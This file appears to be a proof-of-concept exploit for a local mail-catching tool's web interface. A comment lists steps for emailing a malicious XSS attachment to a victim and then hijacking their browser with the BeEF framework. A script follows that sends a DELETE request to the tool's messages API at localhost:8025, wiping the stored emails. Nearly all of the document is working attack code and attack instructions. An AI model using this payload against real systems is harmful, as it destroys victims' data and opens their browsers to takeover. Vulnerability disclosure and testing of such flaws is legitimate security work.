/*
*  1.   Create malicious attachment with payloads stated below
   2.   Attach malicious file to email with payload (XSS)
   3.   Send email
   4.   Wait for victim to open email
   5.   Receive data, get control of victim browser using Beef framework, or manipulate with API data
* */

<script>

    var XMLHttpFactories = [
    function () {
    return new XMLHttpRequest()

},

    function () {  return new ActiveXObject("Msxml2.XMLHTTP")},

    function () {
    return new ActiveXObject("Msxml3.XMLHTTP")

},

    function () {
    return new ActiveXObject("Microsoft.XMLHTTP")

}

    ];

    function createXMLHTTPObject() {
    var xmlhttp = false;
    for (var i=0;i<XMLHttpFactories.length;i++) {
    try {
    xmlhttp = XMLHttpFactories[i]();
}
    catch (e) {
    continue;
}

    break;
}

    return xmlhttp;
}

    var xhr = createXMLHTTPObject();
    xhr.open("DELETE", "http://localhost:8025/api/v1/messages", true);
    xhr.onreadystatechange = function()
    {
        if (xhr.readyState == 4)
        alert("Request completed, with the following status code: " +
        xhr.status);
    }
    xhr.send("");
</script>